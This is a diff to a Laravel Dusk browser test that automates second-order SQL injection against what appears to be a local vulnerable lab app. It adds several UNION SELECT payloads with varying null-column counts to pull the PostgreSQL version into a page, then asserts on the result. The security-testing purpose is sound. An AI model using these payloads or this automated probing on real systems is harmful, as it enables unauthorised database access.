@@ -3,6 +3,7 @@
 namespace Tests\Browser;
 
 use Illuminate\Foundation\Testing\DatabaseMigrations;
+use Illuminate\Support\Facades\Log;
 use Illuminate\Support\Str;
 use Laravel\Dusk\Browser;
 use Tests\DuskTestCase;
@@ -21,7 +22,10 @@ class FoodTest extends DuskTestCase
     ];
 
     protected $secondOrderSQLiQueries = [
-        "--' UNION SELECT 1, null, null, null, null, null, null, null, null, null, null, null, version(), null, null, null, null, null, null, null--'"
+        "--' UNION SELECT 1, null, version(), null, null, null, null, null, null, null--'",
+        "--' UNION SELECT 1, null, version(), null, null, null, null, null, null, null, null--'",
+        "--' UNION SELECT 1, null, version(), null, null, null, null, null, null, null, null, null--'",
+        "--' UNION SELECT 1, null, null, null, null, null, null, null, null, null, null, null, version(), null, null, null, null, null, null, null--'",
     ];
 
 
@@ -31,36 +35,39 @@ class FoodTest extends DuskTestCase
 
             // TODO - Test all parameters
 
-            $maliciousString = $this->secondOrderSQLiQueries[0];
+            collect($this->secondOrderSQLiQueries)->each(function($q) use ($browser) {
+                $maliciousString = $q;
 
-//            $browser->visit('/create')
-//                ->typeSlowly('email', Str::random(5).'@gmail.com', 10)
-//                ->typeSlowly('last_name', 'xuser last_name', 10)
-//                ->typeSlowly('title', 'xuser title', 10)
-//                ->typeSlowly('price', 10, 10)
-//                ->typeSlowly('description', 'description', 10)
-//                ->typeSlowly('first_name', $maliciousString, 10)
-//                ->press('Submit')
-//            ;
+                $browser->visit('/create')
+                    ->typeSlowly('email', 'stefan.dudasko'.Str::random(5).'@gmail.com', 10)
+                    ->typeSlowly('last_name', 'xuser last_name', 10)
+                    ->typeSlowly('title', 'xuser title', 10)
+                    ->typeSlowly('price', 10, 10)
+                    ->typeSlowly('description', 'description', 10)
+                    ->typeSlowly('first_name', $maliciousString, 10)
+                    ->press('Submit')
+                ;
 
-            // TODO - lets suppose we got 500 - check we really have 500
+                // TODO - lets suppose we got 500 - check we really have 500
 //            TODO nech nie je page fixne - http://pib_sqli.test/sqli?page=4
 
-//            $link = $browser->visit('/sqli?page=5')
-//                ->script('return $("table").first().find("td").last().find("a").attr("href")')[0];
+                $browser
+                    ->visit('/sqli?page=1')
+                    ->scrollToElement('a:contains(UNION SELECT):last');
 
-            $browser
-                ->visit('/sqli?page=1')
-                ->scrollToElement('a:contains(UNION SELECT):last');
+                try {
+                    $browser->visit('/sqli?page=1')
+                        ->pause(500)
+                        ->clickLink('UNION SELECT', 'a:contains(UNION SELECT):last')
+                        ->pause(500)
+                        ->assertSee("PostgreSQL")
+                    ;
 
-            $browser->visit('/sqli?page=1')
-                ->pause(3000)
-                ->clickLink('UNION SELECT')
-                ->pause(3000)
-                ->assertSee("PostgreSQL")
-                ->pause(3000)
-            ;
+                    Log::info("Success!!! Query: " . $maliciousString);
+                } catch (\Exception $e) {
 
+                }
+            });
 
             $browser->storeConsoleLog('_test_' . now());
         });
@@ -96,7 +103,7 @@ class FoodTest extends DuskTestCase
 
             $browser->visit('/sqli')
                 ->typeSlowly('q', '\'', 20)
-                ->waitFor('', 2000)
+                ->pause('', 2000)
                 ->press('Search')
                 ->assertSee($expected_error_text_500)
             ;
